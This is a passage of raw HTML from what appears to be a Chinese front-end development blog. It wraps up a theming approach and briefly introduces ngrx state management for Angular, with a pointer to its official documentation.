class="line-number">139</span><br><span class="line-number">140</span><br><span class="line-number">141</span><br><span class="line-number">142</span><br><span class="line-number">143</span><br><span class="line-number">144</span><br><span class="line-number">145</span><br><span class="line-number">146</span><br><span class="line-number">147</span><br><span class="line-number">148</span><br><span class="line-number">149</span><br><span class="line-number">150</span><br><span class="line-number">151</span><br><span class="line-number">152</span><br><span class="line-number">153</span><br><span class="line-number">154</span><br><span class="line-number">155</span><br><span class="line-number">156</span><br><span class="line-number">157</span><br><span class="line-number">158</span><br><span class="line-number">159</span><br><span class="line-number">160</span><br><span class="line-number">161</span><br><span class="line-number">162</span><br></div></div><p>以上就是我在项目中实践过的换肤方案，仅供参考。</p> <h2 id="ngrx"><a href="#ngrx" class="header-anchor">#</a> ngrx</h2> <p>angular中ngrx类似react中的redux，vue中的vuex。考虑到最近工作情况，具体请先查看<a href="https://ngrx.io/docs" target="_blank" rel="noopener noreferrer">官方文档<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>,其中重点是@ngrx/store和@ngrx/component-store这两部分，我们可以配置好@ngrx/store-devtools方便我们像react的redux的devtools中调试。后续我会分享我在项目中使用ngrx中的经验，敬请期待。</p></div> <div class="page-edit"><!----> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">4/2/2021, 5:19:50 PM</span></div></div> <!----> </div> <!----></div><div class="global-ui"></div></div>
    <script src="/vuebloger/assets/js/app.9ef6ba52.js" defer></script><script src="/vuebloger/assets/js/7.c457106d.js" defer></script><script src="/vuebloger/assets/js/1.c991d8a0.js" defer></script><script src="/vuebloger/assets/js/42.f930fbcb.js" defer></script><script src="/vuebloger/assets/js/32.699dcf06.js" defer></script>
  </body>
</html>
